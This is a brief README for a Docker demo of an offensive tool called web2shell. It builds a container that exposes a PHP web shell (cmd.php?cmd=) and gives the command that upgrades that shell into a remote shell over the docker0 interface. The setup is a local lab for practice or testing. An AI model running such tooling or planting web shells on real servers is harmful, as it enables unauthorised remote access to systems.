# web2shell docker demo

1. Build the docker image (`docker build . --tag webshell`)
2. Run the image (`docker run -it -p 8080:80 webshell`)
3. Use web2shell to secure a remote connection on the docker0 interface (`python3 web2shell.py  --url http://127.0.0.1:8080/cmd.php?cmd=SHELL --interface docker0`)

Note: This Docker container only has `python`, `perl`, and `php` binaries.
